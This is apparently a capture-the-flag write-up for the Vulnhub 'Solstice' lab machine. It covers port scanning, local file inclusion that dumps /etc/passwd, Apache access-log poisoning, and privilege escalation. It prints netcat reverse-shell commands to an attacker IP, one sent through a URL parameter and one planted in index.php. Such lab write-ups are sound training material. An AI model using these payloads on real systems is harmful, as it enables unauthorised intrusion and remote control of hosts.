---
title: "Vulnhub & Proving Ground - Solstice"
classes: wide
search: false
categories: 
  - Proving Ground
  - Vulnhub
tags:
  - php service
  - lfi
  - local file inclusion
  - apache log poisoning through lfi
last_modified_at: 2021-01-16T15:58:26+08:00
toc: true
toc_label: "Contents"
---

This is a machine originally from vulnhub `SUNSET: SOLSTICE` [https://www.vulnhub.com/entry/sunset-solstice,499/](https://www.vulnhub.com/entry/sunset-solstice,499/). It was created on 26 June 2020 by `whitecr0wz`. In this machine, we will learn about LFI (Local File Inclusion) and How to create an exploit or poisoning via apache `access.log` (apache log poisoning through lfi). For Privilege Escalation is how to change `index.php` codes to PHP simple reverse shell script on the webserver.

# Network Scanning

rustscan oneliner `rustscan -a 192.168.220.72 --ulimit 10000 -- -sC -sV -T4 -A -oN Solstice.nmap`

```
# Nmap 7.91 scan initiated Sat Jan 16 21:14:59 2021 as: nmap -vvv -p 21,22,25,80,8593,54787,62524 -sC -sV -T4 -A -oN Solstice.nmap 192.168.220.72
Nmap scan report for 192.168.220.72
Host is up, received syn-ack (0.44s latency).
Scanned at 2021-01-16 21:14:59 WIB for 75s

PORT      STATE SERVICE    REASON  VERSION
21/tcp    open  ftp        syn-ack pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.220.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh        syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWAl1JMEsT6kbFmhkFFIZbd2aH3DuBpmLjo1MvWSSFsUlQ+rN9wQ8y469ng7vKZDx19ke+JZ9jUcuJAu4zQ6BHjHDcLTy44WJCESD4oACMCK6+tlMneuINf6KTMr3urfvkvlULi2ffNbMl6Ko9gS/Oqh8Cm9HyAXGTK5MVgmW39QFTXdn7ByQMnnXjKmJ+5nXbf9c9Al9JJCFQAe0irCq2w3ubylh83SwPWsunapn0pW8Czsm2nsFL6aRXCOoNeK7/GmcC8lqENMnUIVRauhpDR3radZ4Uv4ejzHL8H+IklpgVRqBiuzRiqHpGlotNYadcArbYZ4auDwibrtRwgTlD
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9EuXzK3hXcn3ml6Kj69Bo1DACMk1AZWWm9wgPGIyPBQyQLXLazAtoqEP1phT1BNmtyAvScCwsydQwUsRH/3vA=
|   256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATUyTSmh1Tep0cnIVXvQBD6IQTjI8TBEmQEba1Fzkv2
25/tcp    open  smtp       syn-ack Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.49.220], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp    open  http       syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
8593/tcp  open  http       syn-ack PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
54787/tcp open  http       syn-ack PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 16 21:16:14 2021 -- 1 IP address (1 host up) scanned in 75.29 seconds
```

# Enumeration

After we ran `rustscan` to know open ports and all services. Let's check port `8593`

![0b7c9384b48bbebf6272fa57e9ff206e.png](/assets/images/offsec-solstice/bd108af362f64d0dbea038be4d1cc31f.png)

navigate to `Bool List`

![897c8bd6506ddb02d41ae053420692e7.png](/assets/images/offsec-solstice/fe878acb16f549418ae90660a501146e.png)

check LFI vulnerable via curl or browser

```
$ curl "http://192.168.220.72:8593/index.php?book=../../../../../etc/passwd"
<html>
    <head>
        <link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
        <link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?book=list">Book List</a>
        </div>
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin
smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
</p>    </body>
</html>
```

local file inclusion access log

![4e84318f100d6649bf3a2a70d85a5033.png](/assets/images/offsec-solstice/930114eaae394226b8ec353e7ba38299.png)

create reverse shell via php command from access.log

`curl -s "http://192.168.220.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20192.168.49.220%204444%20-e%20%2Fbin%2Fbash%20"`

![591825a3b29b11ac9f85283236800c1e.png](/assets/images/offsec-solstice/591739eb41b7450699abf857b851ed72.png)

![96e0baa8e216558d9bfe02fe293655c1.png](/assets/images/offsec-solstice/2debb99492284e2dbf038635d996a425.png)

# Privilege Escalation

php service on server.

![87415e24597380cc1741a684fb10ec4c.png](/assets/images/offsec-solstice/4cfb913a85cf467eb7975558102e000f.png)

![6a0bf96e6b942ff56a5765833fbb89cc.png](/assets/images/offsec-solstice/31661a60b5e248649582f1c573bfbb09.png)

change index.php source codes to

`<?php system('nc 192.168.49.220 4445 -e /bin/bash')?>` and run `curl 127.0.0.1:57`

![611057513d7c49a3ebc7b251f6db7399.png](/assets/images/offsec-solstice/5f05325281b146538191b3eb1c2eb01d.png)

reverse shell on attacker machine

![f5005ceb7dc7c1d4775a9271ab57b9a9.png](/assets/images/offsec-solstice/724104bd089642bda9398c50fd38078c.png)